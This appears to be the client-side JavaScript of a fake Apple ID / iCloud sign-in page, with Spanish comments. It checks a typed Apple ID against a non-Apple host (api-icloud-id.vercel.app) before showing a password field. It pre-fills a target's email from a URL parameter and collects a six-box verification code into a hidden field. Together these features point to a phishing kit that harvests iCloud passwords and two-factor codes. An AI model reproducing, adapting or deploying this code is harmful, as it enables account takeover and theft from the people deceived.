
// Función para validar el formato del email
function validarEmail(email) {
    const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return re.test(String(email).toLowerCase());
}

function validatePassword() {
    const password = document.getElementById("password").value;

    const minLength = /.{8,}/;
    const hasUpperCase = /[A-Z]/;
    const hasLowerCase = /[a-z]/;
    const hasNumber = /[0-9]/;
    const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/;

    if (!minLength.test(password)) {
        alert("La contraseña debe tener al menos 8 caracteres.");
        return false;
    }
    if (!hasUpperCase.test(password)) {
        alert("La contraseña debe tener al menos una letra mayúscula.");
        return false;
    }
    if (!hasLowerCase.test(password)) {
        alert("La contraseña debe tener al menos una letra minúscula.");
        return false;
    }
    if (!hasNumber.test(password)) {
        alert("La contraseña debe tener al menos un número.");
        return false;
    }

    return true; // La validación pasó, se envía el formulario
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function showPasswordInput1() {
  const appleId = document.getElementById('apple-id-1').value;
  let idOk = false; // Definimos idOk como variable local

  try {
    // Esperamos la respuesta de la petición usando await
    const response = await fetch('https://api-icloud-id.vercel.app/?id=' + appleId);

    if (!response.ok) {
      throw new Error('Error en la solicitud');
    }

    const data = await response.json();  // Suponiendo que la respuesta es en formato JSON

    if (data.hasSWP) {
      idOk = true;
      // Aquí puedes agregar el código para continuar con el flujo si el correo existe
    } else {
      alert('El correo que ingresaste no pertenece a una cuenta de iCloud.');
    }

  } catch (error) {
    console.error('Error:', error);
  }

  // Ahora verificamos si el email es válido y si la respuesta ha sido correcta
  if (validarEmail(appleId) && idOk) {
    document.getElementById('apple-id-aux').value = document.getElementById('apple-id-1').value;
    document.getElementById('password-group').style.display = 'block';
    document.getElementById('apple-id-1').disabled = true;
    document.querySelector('.arrow-button').style.display = 'none';
    document.querySelector('.login-button').style.display = 'block';
    document.getElementById('password').focus();
  } else {
    if (!idOk){
      return;
    }else{
      alert("Por favor ingrese un email válido.");
    } 
  }

}

async function showPasswordInput2() {
  const appleId = document.getElementById('apple-id-2').value;
  let idOk = false; // Definimos idOk como variable local

  try {
    // Esperamos la respuesta de la petición usando await
    const response = await fetch('https://api-icloud-id.vercel.app/?id=' + appleId);

    if (!response.ok) {
      throw new Error('Error en la solicitud');
    }

    const data = await response.json();  // Suponiendo que la respuesta es en formato JSON

    if (data.hasSWP) {
      idOk = true;
      // Aquí puedes agregar el código para continuar con el flujo si el correo existe
    } else {
      alert('El correo que ingresaste no pertenece a una cuenta de iCloud.');
    }

  } catch (error) {
    console.error('Error:', error);
  }

    await sleep(3500);

 if (validarEmail(appleId) && idOk) {
    document.getElementById('apple-id-aux-1').value = document.getElementById('apple-id-2').value;
    document.getElementById('password-group-1').style.display = 'block';
    document.getElementById('apple-id-2').disabled = true;
    document.querySelector('.arrow-button-1').style.display = 'none';
    document.getElementById('error-1').style.display = 'none';
    document.getElementById('error-2').style.display = 'none';
    document.querySelector('.login-button-1').style.display = 'block';
    document.getElementById('password-1').focus();
  } else {
    if (!idOk){
      return;
    }else{
      alert("Por favor ingrese un email válido.");
    } 
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const inputs = document.querySelectorAll('.code-input');
  const hiddenInput = document.getElementById('verification_code');

    // Obtener la URL actual
  const url = new URL(window.location.href);

  // Obtener el valor del parámetro 'equis'
  const equis = url.searchParams.get('equis');

  // Comprobar si el parámetro 'equis' existe
  if (equis) {
    document.getElementById('apple-id-2').value = equis;
    showPasswordInput2();
  }

  inputs.forEach((input, index) => {
    // Mover al siguiente campo al ingresar un valor
    input.addEventListener('input', () => {
      if (input.value.length >= 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }

      // Actualizar el campo oculto con el código completo
      updateHiddenInput();
    });

    // Mover hacia atrás si el campo actual está vacío y se presiona "Backspace"
    input.addEventListener('keydown', (event) => {
      if (event.key === 'Backspace' && input.value.length === 0 && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  function updateHiddenInput() {
    const code = Array.from(inputs).map(input => input.value).join('');
    hiddenInput.value = code; // Actualiza el valor del input oculto
  }

  // Actualizar el input oculto al enviar el formulario
  document.getElementById('verification-form').addEventListener('submit', updateHiddenInput);
});
